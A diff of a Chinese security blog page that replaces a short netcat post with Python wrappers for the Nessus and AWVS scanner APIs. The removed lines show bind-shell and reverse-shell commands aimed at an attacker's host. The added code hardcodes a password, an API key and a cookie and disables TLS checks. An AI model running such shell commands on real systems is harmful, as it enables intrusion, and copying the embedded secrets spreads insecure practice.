@@ -4,17 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="nc的高级用法, Simle丶樱木">
+    <meta name="keywords" content="nessus与awvs API, Simle丶樱木">
     <meta name="description" content="
-使用telnet连接服务器
+前言 最近在做自动化安全扫描器开发，在项目中想引用比较知名的扫描器，如是整理了一下API作为参考
 
-在被攻击主机上开启监听服务
-远程主机运行 
-nc -l -p port -t -e cmd.exe (-t:以telnet形式连接 -e:程序定向)
-
-本地机器上直接连接telnet 连接：
-
-telnet ">
+ Nessus 6.x版本#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Time   ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +18,7 @@ telnet ">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>nc的高级用法 | Simle丶樱木</title>
+    <title>nessus与awvs API | Simle丶樱木</title>
     <link rel="icon" type="image/png" href="/cat.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -312,13 +308,13 @@ telnet ">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        nc的高级用法
+                        nessus与awvs API
                     </div>
                 </div>
             </div>
@@ -430,16 +426,16 @@ telnet ">
                     
                     <div class="article-tag">
                         
+                            <a href="/tags/扫描器/">
+                                <span class="chip bg-color">扫描器</span>
+                            </a>
+                        
                             <a href="/tags/工具/">
                                 <span class="chip bg-color">工具</span>
                             </a>
                         
-                            <a href="/tags/安全/">
-                                <span class="chip bg-color">安全</span>
-                            </a>
-                        
-                            <a href="/tags/Linux/">
-                                <span class="chip bg-color">Linux</span>
+                            <a href="/tags/自动化/">
+                                <span class="chip bg-color">自动化</span>
                             </a>
                         
                     </div>
@@ -450,8 +446,8 @@ telnet ">
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/安全/" class="post-category">
-                                安全
+                            <a href="/categories/漏扫/" class="post-category">
+                                漏扫
                             </a>
                         
                     </div>
@@ -463,7 +459,7 @@ telnet ">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2018-05-30
+                    2019-08-02
                 </div>
                 
 
@@ -472,14 +468,14 @@ telnet ">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    309
+                    2,163
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    13 分
                 </div>
                 
 				
@@ -495,44 +491,581 @@ telnet ">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <ul>
-<li>使用telnet连接服务器</li>
-</ul>
-<p>在被攻击主机上开启监听服务</p>
-<pre><code>远程主机运行 
-nc -l -p port -t -e cmd.exe (-t:以telnet形式连接 -e:程序定向)
-
-本地机器上直接连接telnet 连接：
-
-telnet  ip  -p
-</code></pre><p>让远程主机主动连接本地机器</p>
-<pre><code>Sell中执行:nc路径 -vv 本机ip（链接者的IP不是服务器的ip ） 端口 -e cmd路径
-
-首先本地监听 nc -vv -l -p 8080
-
--l：监听端口，监听入站信息-p：后跟本地端口号-v：显示端口的信息，如果使用-vv的话，则会显示端口更详细的信
-</code></pre><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=25706282&auto=0&height=66"><br></iframe> 
-
+                <p><img src="http://upload-images.jianshu.io/upload_images/3941016-beb5143ed978f26e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="nessus.jpg"></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> 最近在做自动化安全扫描器开发，在项目中想引用比较知名的扫描器，如是整理了一下API作为参考</p>
 <a id="more"></a>
-<h1 id="关于Linux下面的用法："><a href="#关于Linux下面的用法：" class="headerlink" title="关于Linux下面的用法："></a>关于Linux下面的用法：</h1><p>因为Linux下面nc 没有  -e 的选项，处于安全考虑</p>
-<h1 id="Linux用创建管道代替-e-选项"><a href="#Linux用创建管道代替-e-选项" class="headerlink" title="Linux用创建管道代替-e 选项"></a>Linux用创建管道代替-e 选项</h1><ul>
-<li>在服务器1上（被攻击的机器）<pre><code>root@bt:~#mknod /tmp/backpipe p
-root@bt:~#/bin/sh 0&lt;/tmp/backpipe | nc   服务器2的IP（攻击机的ip）listenport 1&gt;/tmp/backpipe
-</code></pre></li>
-<li>在服务器2上监听：<pre><code>nc  -lvnp  端口
-</code></pre></li>
-</ul>
-<h1 id="nc-实现聊天"><a href="#nc-实现聊天" class="headerlink" title="nc  实现聊天"></a>nc  实现聊天</h1><ul>
-<li>说明主机为Linux服务， 服务器和客户端都是同一台主机</li>
-</ul>
-<pre><code>在服务器上运行：
+<h1 id="Nessus-6-x版本"><a href="#Nessus-6-x版本" class="headerlink" title=" Nessus 6.x版本"></a><font color="#C71585" size="4" face="黑体"> Nessus 6.x版本</font></h1><pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Time    : 2017/8/21 下午4:08
+# @Author  : Yu BenLiu
+# @Site    : QVQ
+# @File    : nessus_api_6.py.py
+# @Software: PyCharm
+import sys
+# sys.path.append(&quot;..&quot;)
 
-nc  -l -p  65533
+import requests, json, csv, os, time
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-客户端上运行：
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+# from core.settings import talscan_config,redis_task
+from host_type_check import *
+
+talscan_config = {&quot;report_filters&quot;: {
+    &quot;awvs_white_list&quot;: [&quot;orange&quot;, &quot;red&quot;, &quot;blue&quot;],  # green,blue,orange,red四种级别
+    &quot;nessus_white_list&quot;: [&quot;High&quot;, &quot;Medium&quot;, &quot;Low&quot;],
+    &quot;bug_black_list&quot;: [  # 漏洞黑名单，过滤掉一些危害等级高，但没什么卵用的洞
+        &quot;User credentials are sent in clear text&quot;
+    ]
+}
+}
 
 
-nc  服务器地址（127.0.0.1） 服务器端口号如（65535）
+class Work(object):
+    def __init__(self, scan_id=&quot;&quot;, scan_uuid=&quot;&quot;,scan_target=&quot;&quot;, scan_type=&quot;&quot;, scan_args=&quot;&quot;, back_fn=None):
+        self.api_url = &#39;https://192.168.29.198:8834&#39;
+        self.username = &quot;root&quot;
+        self.password = &quot;ybl8651073&quot;
+        self.filter = talscan_config[&quot;report_filters&quot;]
+        self.report_save_dir = &#39;/tmp/&#39;
+        self.verify = False
+        self.token = &#39;&#39;
+        self.enable = True
+        self.scan_uuid=scan_uuid
+        self.scan_id = scan_id
+        self.target = scan_target
+        self.scan_type = scan_type
+        self.args = scan_args
+        self.back_fn = back_fn
+        self.result = {}
+
+    def connect(self, method, resource, data=None, params=None):
+        headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(self.token), &#39;content-type&#39;: &#39;application/json&#39;}
+        data = json.dumps(data)
+
+        try:
+            if method == &#39;POST&#39;:
+                r = requests.post(str(self.api_url + resource), data=data, headers=headers, verify=self.verify)
+
+            elif method == &#39;PUT&#39;:
+                r = requests.put(str(self.api_url + resource), data=data, headers=headers, verify=self.verify)
+            elif method == &#39;DELETE&#39;:
+                r = requests.delete(str(self.api_url + resource), data=data, headers=headers, verify=self.verify)
+            else:
+                r = requests.get(str(self.api_url + resource), params=params, headers=headers, verify=self.verify)
+        except Exception, e:
+            print  e
+            return {&quot;status&quot;: 3}
+
+        if r.status_code == 200:
+            try:
+                data = r.json()
+            except:
+                data = r.content
+
+            result = {&quot;status&quot;: 1, &quot;data&quot;: data}
+            return result
+        else:
+            result = {&quot;status&quot;: 3}
+            return result
+
+    def nessus_login(self):
+        login = {&#39;username&#39;: self.username, &#39;password&#39;: self.password}
+        data = self.connect(&#39;POST&#39;, &#39;/session&#39;, data=login)
+        print data
+        status = data[&quot;status&quot;]
+        print status
+        if status == 1:
+            result = {&quot;status&quot;: 1, &quot;data&quot;: data[&quot;data&quot;][&#39;token&#39;]}
+            print  result
+            return result
+        else:
+            result = {&quot;status&quot;: 0}
+            print result
+            return result
+
+    def nessus_process_status(self, sid):
+        # canceled,running,completed
+        data = self.nessus_login()
+        status = data[&quot;status&quot;]
+        if status == 1:
+            token = data[&quot;data&quot;]
+        else:
+            result = {&quot;status&quot;: 0}
+            return result
+
+        headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;}
+        url = self.api_url + &#39;/scans/&#39;
+        data = requests.get(url=url, params=None, headers=headers, verify=self.verify)
+        res = data.json()
+        info1=res[&#39;scans&#39;]
+        print info1
+        try:
+            return  info1
+        except:
+            return {&quot;status&quot;: 0}
+    def  nessus_policies(self,):
+        data = self.nessus_login()
+        status = data[&quot;status&quot;]
+        if status == 1:
+            token = data[&quot;data&quot;]
+        else:
+            result = {&quot;status&quot;: 0}
+            return result
+
+        headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;}
+        url = self.api_url + &#39;/policies/&#39;
+        data = requests.get(url=url, params=None, headers=headers, verify=self.verify)
+        res = data.json()
+        info=res[&#39;policies&#39;]
+        print info
+        try:
+            return info
+        except:
+            return {&quot;status&quot;: 0}
+
+
+    def nessus_add_task(self):
+        if is_domain(self.target) or is_host(self.target):
+            create_data = {
+                &quot;uuid&quot;: self.scan_uuid,
+                # &quot;uuid&quot;: &#39;ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66&#39;,#选择策略
+                &quot;settings&quot;: {
+                    &quot;name&quot;: self.scan_id,
+                    &quot;scanner_id&quot;: &quot;1&quot;,
+                    &quot;text_targets&quot;: self.target,
+                    &quot;enabled&quot;: False,
+                    &quot;launch_now&quot;: True,
+                }
+            }
+            post_data = json.dumps(create_data)
+
+            data = self.nessus_login()
+            status = data[&quot;status&quot;]
+            if status == 1:
+                token = data[&quot;data&quot;]
+            else:
+                print  &#39;99&#39;
+                return {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :登陆失败&quot;}
+
+            headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;}
+            r = requests.post(url=str(self.api_url + &#39;/scans&#39;), data=post_data, headers=headers, verify=self.verify)
+
+            if r.status_code == 200:
+                try:
+                    get_id = r.json()
+                except:
+                    get_id = r.content
+
+                sid = get_id[&#39;scan&#39;][&#39;id&#39;]
+                result = {&quot;status&quot;: 1, &quot;data&quot;: sid}
+                return result
+            else:
+                result = {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :增加任务失败&quot;}
+                return result
+        else:
+            return {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :格式错误&quot;}
+
+    def nessus_stop_task(self, sid):
+        data = self.nessus_login()
+        status = data[&quot;status&quot;]
+        if status == 1:
+            token = data[&quot;data&quot;]
+        else:
+            result = {&quot;status&quot;: 0}
+            return result
+
+        headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;}
+        url = str(self.api_url + &#39;/scans/{0}/stop/&#39;.format(sid))
+        r = requests.post(url=url, params=None, headers=headers, verify=self.verify)
+        if r.status_code == 200:
+            result = {&quot;status&quot;: 1}
+            return result
+        else:
+            result = {&quot;status&quot;: 0}
+            return result
+
+    def nessus_report_task(self, taskid, sid):
+        bug_list = []
+
+        data = self.nessus_login()
+        status = data[&quot;status&quot;]
+        if status == 1:
+            token = data[&quot;data&quot;]
+        else:
+            result = {&quot;status&quot;: 0}
+            return result
+
+        headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;}
+        url = str(self.api_url + &#39;/scans/{0}/export&#39;.format(sid))
+        data = json.dumps({&quot;format&quot;: &quot;csv&quot;})
+        r = requests.post(url=url, data=data, headers=headers, verify=self.verify)
+        try:
+            file = r.json()[&#39;token&#39;]
+        except:
+            result = {&quot;status&quot;: 0}
+            return result
+        down_file_url = str(self.api_url + &#39;/scans/exports/{0}/download&#39;.format(file))
+        r = requests.get(url=down_file_url, headers=headers, verify=self.verify)
+
+        csv_file = str(self.report_save_dir + &quot;{0}_nessus.csv&quot;.format(str(taskid)))
+        f = open(csv_file, &#39;wb&#39;)
+        data = r.content
+        f.write(data)
+        f.close()
+
+        csv_open_file = open(csv_file, &#39;rb&#39;)
+        csvReader = csv.reader(csv_open_file)
+        for row in csvReader:
+            parameterStr = &#39;,&#39;.join(row)
+            parameters = parameterStr.split(&#39;,&#39;)
+            PID = parameters[0]
+            CVE = parameters[1]
+            CVSS = parameters[2]
+            Risk = parameters[3]
+            Host = parameters[4]
+            Protocol = parameters[5]
+            Port = parameters[6]
+            Name = parameters[7]
+            Synopsis = parameters[8]
+            Description = parameters[9]
+            Solution = parameters[10]
+            See_Also = parameters[11]
+            Plugin_Output = parameters[12]
+
+            bug_name = str(Name)
+            bug_level = str(Risk)
+            bug_summary = str(Synopsis) + &quot;\r\n&quot; + str(Description)
+            bug_detail = &quot;Bug Port : &quot; + str(Port) + &quot;\r\n&quot; + &quot;CVE : &quot; + str(CVE)
+            bug_repair = str(Solution) + &quot;\r\n&quot; + str(Plugin_Output)
+
+            if str(Risk) in self.filter[&#39;nessus_white_list&#39;]:
+                bug_list.append(
+                    {&#39;bug_name&#39;: bug_name, &#39;bug_level&#39;: bug_level, &#39;bug_summary&#39;: bug_summary, &#39;bug_detail&#39;: bug_detail,
+                     &#39;bug_repair&#39;: bug_repair})
+
+        csv_open_file.close()
+        # os.remove(csv_file)
+
+        if len(bug_list) &gt; 0:
+            result = {&quot;status&quot;: 1, &quot;data&quot;: bug_list}
+            return bug_list
+        else:
+            result = {&quot;status&quot;: 0}
+            return result
+
+    def run(self):
+        result = self.nessus_add_task()
+        status = result[&quot;status&quot;]
+
+        if status == 1:
+            nessus_id = int(result[&quot;data&quot;])
+            while True:
+                time.sleep(5)
+                nessus_process = self.nessus_process_status(nessus_id)
+                nessus_status = nessus_process[&quot;status&quot;]
+                if nessus_status == 1:
+                    nessus_process_data = nessus_process[&quot;data&quot;].encode(&quot;utf8&quot;)
+                    if nessus_process_data == &quot;completed&quot;:
+                        break
+
+            time.sleep(20)  # 推迟20秒，获取报告;nessus任务进程到100有部分延迟结束时间
+            nessus_report = self.nessus_report_task(self.scan_id, nessus_id)
+            nessus_report_status = nessus_report[&quot;status&quot;]
+            if nessus_report_status == 1:
+                nessus_report_data = nessus_report[&quot;data&quot;]
+                data = []
+                for line in nessus_report_data:
+                    task_result = {
+                        &quot;scan_id&quot;: self.scan_id,
+                        &quot;model&quot;: &quot;nessus&quot;,
+                        &quot;bug_author&quot;: &quot;bing&quot;,
+                        &quot;bug_name&quot;: line[&quot;bug_name&quot;],
+                        &quot;bug_level&quot;: line[&quot;bug_level&quot;],
+                        &quot;bug_summary&quot;: line[&quot;bug_summary&quot;],
+                        &quot;bug_detail&quot;: line[&quot;bug_detail&quot;],
+                        &quot;bug_repair&quot;: line[&quot;bug_repair&quot;]
+                    }
+                    redis_task.sadd(&quot;nessus_result&quot;, task_result)
+                    print task_result
+
+                # 任务最终结束
+                final_result = {&quot;status&quot;: 1, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;}
+
+                redis_task.sadd(&quot;nessus_result&quot;, final_result)
+                print final_result
+
+            else:
+                # 任务最终结束
+                final_result = {&quot;status&quot;: 1, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;}
+
+                redis_task.sadd(&quot;nessus_result&quot;, final_result)
+                print final_result
+
+        elif status == 2:
+            nessus_error = result[&quot;data&quot;]
+            final_result = {&quot;status&quot;: 2, &quot;data&quot;: nessus_error, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;}
+
+            redis_task.sadd(&quot;nessus_result&quot;, final_result)
+            print final_result
+
+
+#t = Work(&quot;1234455&quot;,&quot;ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66&quot;,&quot;www.baidu.com&quot;)
+#s = t.nessus_report_task(5,84)
+#print s
+</code></pre><h1 id="Awvs-最新的api"><a href="#Awvs-最新的api" class="headerlink" title=" Awvs 最新的api"></a><font color="#C71585" size="4" face="黑体"> Awvs 最新的api</font></h1><pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Time    : 2017/8/22 下午3:08
+# @Author  : Yu BenLiu
+# @Site    : QVQ
+# @File    : awvs_api_11.py.py
+# @Software: PyCharm
+
+import json
+import requests
+import requests.packages.urllib3
+
+&#39;&#39;&#39;
+import requests.packages.urllib3.util.ssl_
+requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = &#39;ALL&#39;
+or
+pip install requests[security]
+&#39;&#39;&#39;
+requests.packages.urllib3.disable_warnings()
+tarurl = &quot;https://192.168.29.207:3443/&quot;
+apikey = &quot;1986ad8c0a5b3df4d7028d5f3c06e936c38438d15a1fb4f4588e034d3c3490fef&quot;
+headers = {&quot;X-Auth&quot;: apikey, &quot;content-type&quot;: &quot;application/json&quot;}
+
+
+def addtask(url=&#39;&#39;):
+    # 添加任务
+    data = {&quot;address&quot;: url, &quot;description&quot;: url, &quot;criticality&quot;: &quot;10&quot;}
+    try:
+        response = requests.post(tarurl + &quot;/api/v1/targets&quot;, data=json.dumps(data), headers=headers, timeout=30,
+                                 verify=False)
+        result = json.loads(response.content)
+        return result[&#39;target_id&#39;]
+    except Exception as e:
+        print(str(e))
+        return
+
+
+def startscan(url):
+    # 先获取全部的任务.避免重复
+    # 添加任务获取target_id
+    # 开始扫描
+    &#39;&#39;&#39;
+    11111111-1111-1111-1111-111111111112    High Risk Vulnerabilities
+    11111111-1111-1111-1111-111111111115    Weak Passwords
+    11111111-1111-1111-1111-111111111117    Crawl Only
+    11111111-1111-1111-1111-111111111116    Cross-site Scripting Vulnerabilities
+    11111111-1111-1111-1111-111111111113    SQL Injection Vulnerabilities
+    11111111-1111-1111-1111-111111111118    quick_profile_2 0   {&quot;wvs&quot;: {&quot;profile&quot;: &quot;continuous_quick&quot;}}
+    11111111-1111-1111-1111-111111111114    quick_profile_1 0   {&quot;wvs&quot;: {&quot;profile&quot;: &quot;continuous_full&quot;}}
+    11111111-1111-1111-1111-111111111111    Full Scan   1   {&quot;wvs&quot;: {&quot;profile&quot;: &quot;Default&quot;}}
+    &#39;&#39;&#39;
+    targets = getscan()
+    if url in targets:
+        return &quot;repeat&quot;
+    else:
+        target_id = addtask(url)
+        data = {&quot;target_id&quot;: target_id, &quot;profile_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;,
+                &quot;schedule&quot;: {&quot;disable&quot;: False, &quot;start_date&quot;: None, &quot;time_sensitive&quot;: False}}
+        try:
+            response = requests.post(tarurl + &quot;/api/v1/scans&quot;, data=json.dumps(data), headers=headers, timeout=30,
+                                     verify=False)
+            result = json.loads(response.content)
+            return result[&#39;target_id&#39;]
+        except Exception as e:
+            print(str(e))
+            return
+
+
+def getstatus(scan_id):
+    # 获取scan_id的扫描状况
+    try:
+        response = requests.get(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id), headers=headers, timeout=30, verify=False)
+        result = json.loads(response.content)
+        status = result[&#39;current_session&#39;][&#39;status&#39;]
+        # 如果是completed 表示结束.可以生成报告
+        if status == &quot;completed&quot;:
+            return getreports(scan_id)
+        else:
+            return result[&#39;current_session&#39;][&#39;status&#39;]
+    except Exception as e:
+        print(str(e))
+        return
+
+
+def delete_scan(scan_id):
+    # 删除scan_id的扫描
+    try:
+        response = requests.delete(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id), headers=headers, timeout=30, verify=False)
+        # 如果是204 表示删除成功
+        if response.status_code == &quot;204&quot;:
+            return True
+        else:
+            return False
+    except Exception as e:
+        print(str(e))
+        return
+
+
+def delete_target(scan_id):
+    # 删除scan_id的扫描
+    try:
+        response = requests.delete(tarurl + &quot;/api/v1/targets/&quot; + str(scan_id), headers=headers, timeout=30,
+                                   verify=False)
+        # 如果是204 表示删除成功
+        if response.status_code == &quot;204&quot;:
+            return True
+        else:
+            return False
+    except Exception as e:
+        print(str(e))
+        return
+
+
+def stop_scan(scan_id):
+    # 停止scan_id的扫描
+    try:
+        response = requests.post(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id + &quot;/abort&quot;), headers=headers, timeout=30,
+                                 verify=False)
+        # 如果是204 表示停止成功
+        if response.status_code == &quot;204&quot;:
+            return True
+        else:
+            return False
+    except Exception as e:
+        print(str(e))
+        return
+def scan_status():
+    # 停止scan_id的扫描
+    try:
+        response = requests.get(tarurl + &quot;/api/v1/me/stats&quot;, headers=headers, timeout=30, verify=False)
+        result = json.loads(response.content)
+        print result
+        return result
+    except Exception as e:
+        print(str(e))
+        return
+
+
+def getreports(scan_id):
+    # 获取scan_id的扫描报告
+    &#39;&#39;&#39;
+    11111111-1111-1111-1111-111111111111    Developer
+    21111111-1111-1111-1111-111111111111    XML
+    11111111-1111-1111-1111-111111111119    OWASP Top 10 2013
+    11111111-1111-1111-1111-111111111112    Quick
+    &#39;&#39;&#39;
+    data = {&quot;template_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;,
+            &quot;source&quot;: {&quot;list_type&quot;: &quot;scans&quot;, &quot;id_list&quot;: [scan_id]}}
+    try:
+        response = requests.post(tarurl + &quot;/api/v1/reports&quot;, data=json.dumps(data), headers=headers, timeout=30,
+                                 verify=False)
+        result = response.headers
+        report = result[&#39;Location&#39;].replace(&#39;/api/v1/reports/&#39;, &#39;/reports/download/&#39;)
+        return tarurl.rstrip(&#39;/&#39;) + report
+    except Exception as e:
+        print(str(e))
+        return
+    finally:
+        delete_scan(scan_id)
+
+
+def config(url):
+    target_id = addtask(url)
+    # 获取全部的扫描状态
+    data = {
+        &quot;excluded_paths&quot;: [&quot;manager&quot;, &quot;phpmyadmin&quot;, &quot;testphp&quot;],
+        &quot;user_agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36&quot;,
+        &quot;custom_headers&quot;: [&quot;Accept: */*&quot;, &quot;Referer:&quot; + url, &quot;Connection: Keep-alive&quot;],
+        &quot;custom_cookies&quot;: [{&quot;url&quot;: url,
+                            &quot;cookie&quot;: &quot;UM_distinctid=15da1bb9287f05-022f43184eb5d5-30667808-fa000-15da1bb9288ba9; PHPSESSID=dj9vq5fso96hpbgkdd7ok9gc83&quot;}],
+        &quot;scan_speed&quot;: &quot;moderate&quot;,  # sequential/slow/moderate/fast more and more fast
+        &quot;technologies&quot;: [&quot;PHP&quot;],  # ASP,ASP.NET,PHP,Perl,Java/J2EE,ColdFusion/Jrun,Python,Rails,FrontPage,Node.js
+        # 代理
+        &quot;proxy&quot;: {
+            &quot;enabled&quot;: False,
+            &quot;address&quot;: &quot;127.0.0.1&quot;,
+            &quot;protocol&quot;: &quot;http&quot;,
+            &quot;port&quot;: 8080,
+            &quot;username&quot;: &quot;aaa&quot;,
+            &quot;password&quot;: &quot;bbb&quot;
+        },
+        # 无验证码登录
+        &quot;login&quot;: {
+            &quot;kind&quot;: &quot;automatic&quot;,
+            &quot;credentials&quot;: {
+                &quot;enabled&quot;: False,
+                &quot;username&quot;: &quot;test&quot;,
+                &quot;password&quot;: &quot;test&quot;
+            }
+        },
+        # 401认证
+        &quot;authentication&quot;: {
+            &quot;enabled&quot;: False,
+            &quot;username&quot;: &quot;test&quot;,
+            &quot;password&quot;: &quot;test&quot;
+        }
+    }
+    try:
+        res = requests.patch(tarurl + &quot;/api/v1/targets/&quot; + str(target_id) + &quot;/configuration&quot;, data=json.dumps(data),
+                             headers=headers, timeout=30 * 4, verify=False)
+
+        data = {&quot;target_id&quot;: target_id, &quot;profile_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;,
+                &quot;schedule&quot;: {&quot;disable&quot;: False, &quot;start_date&quot;: None, &quot;time_sensitive&quot;: False}}
+        try:
+            response = requests.post(tarurl + &quot;/api/v1/scans&quot;, data=json.dumps(data), headers=headers, timeout=30,
+                                     verify=False)
+            result = json.loads(response.content)
+            return result[&#39;target_id&#39;]
+        except Exception as e:
+            print(str(e))
+            return
+    except Exception as e:
+        raise e
+
+def getvulnerabilities():
+    # 停止scan_id的扫描
+    try:
+        response = requests.get(tarurl + &quot;/api/v1/vulnerabilities&quot;, headers=headers, timeout=30, verify=False)
+        result = json.loads(response.content)
+        print result
+        return result
+    except Exception as e:
+        print(str(e))
+        return
+def getscan():
+    # 获取全部的扫描状态
+    targets = []
+    try:
+        response = requests.get(tarurl + &quot;/api/v1/scans&quot;, headers=headers, timeout=30, verify=False)
+        results = json.loads(response.content)
+        return results
+    except Exception as e:
+        raise e
+def getvulnerabilitiesinfo(sid):
+    # 停止scan_id的扫描
+    try:
+        response = requests.get(tarurl + &quot;/api/v1/vulnerabilities/&quot;+sid, headers=headers, timeout=30, verify=False)
+        result = json.loads(response.content)
+        print result
+        return result
+    except Exception as e:
+        print(str(e))
+        return
+
+
+if __name__ == &#39;__main__&#39;:
+    info=getscan()
+    print info
+    print type(info)
+
+    #print getreports(&#39;f22d4aa1-e2de-4307-bd9d-ddf3aa531bc1&#39;,locals())
+   # print config(&#39;http://testhtml5.vulnweb.com/&#39;)
 </code></pre>
             </div>
             <hr/>
@@ -558,7 +1091,7 @@ nc  服务器地址（127.0.0.1） 服务器端口号如（65535）
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yubenliu.cn/2018/05/30/nc 的高级用法/">http://yubenliu.cn/2018/05/30/nc 的高级用法/</a>
+                    <a href="http://yubenliu.cn/2019/08/02/scan/">http://yubenliu.cn/2019/08/02/scan/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -596,16 +1129,16 @@ nc  服务器地址（127.0.0.1） 服务器端口号如（65535）
                     
                         <div class="article-tag">
                             
+                                <a href="/tags/扫描器/">
+                                    <span class="chip bg-color">扫描器</span>
+                                </a>
+                            
                                 <a href="/tags/工具/">
                                     <span class="chip bg-color">工具</span>
                                 </a>
                             
-                                <a href="/tags/安全/">
-                                    <span class="chip bg-color">安全</span>
-                                </a>
-                            
-                                <a href="/tags/Linux/">
-                                    <span class="chip bg-color">Linux</span>
+                                <a href="/tags/自动化/">
+                                    <span class="chip bg-color">自动化</span>
                                 </a>
                             
                         </div>
@@ -775,36 +1308,31 @@ nc  服务器地址（127.0.0.1） 服务器端口号如（65535）
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2018/05/30/mother/">
+                <a href="/2019/08/02/CVE-2018-11776漏洞复现/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="妈妈生日快乐">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="CVE-2018-11776漏洞复现">
                         
-                        <span class="card-title">妈妈生日快乐</span>
+                        <span class="card-title">CVE-2018-11776漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-
-世界上如果选择一个最爱你的人那一定是你的妈妈
-
-
-小时候一直觉得自己不会长大，永远待在父母的身边，记得小时候如果过生日再怎么淘气，你也不会打我，嘿嘿，在你眼中我是个永远长不大的小屁孩，惹你生气，记得初中的时候第一次住在学校，一个星期后回
+                            0x01 漏洞概述2018年8月23日，ApacheStrust2发布最新安全公告，ApacheStruts2 存在远程代码执行的高危漏洞，该漏洞由SemmleSecurity Researchteam的安全研究员汇报，漏洞编号为CVE-2
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2018-05-30
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-08-02
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/心情/" class="post-category">
-                                    心情
+                            <a href="/categories/web安全/" class="post-category">
+                                    web安全
                                 </a>
                             
                             
@@ -814,8 +1342,16 @@ nc  服务器地址（127.0.0.1） 服务器端口号如（65535）
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/心情，母亲/">
-                        <span class="chip bg-color">心情，母亲</span>
+                    <a href="/tags/漏洞复现/">
+                        <span class="chip bg-color">漏洞复现</span>
+                    </a>
+                    
+                    <a href="/tags/CVE-2018-11776/">
+                        <span class="chip bg-color">CVE-2018-11776</span>
+                    </a>
+                    
+                    <a href="/tags/struts2/">
+                        <span class="chip bg-color">struts2</span>
                     </a>
                     
                 </div>
@@ -829,38 +1365,35 @@ nc  服务器地址（127.0.0.1） 服务器端口号如（65535）
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2018/05/30/python-task-ququ22e/">
+                <a href="/2019/08/01/kubernetes的部署/">
                     <div class="card-image">
                         
                         
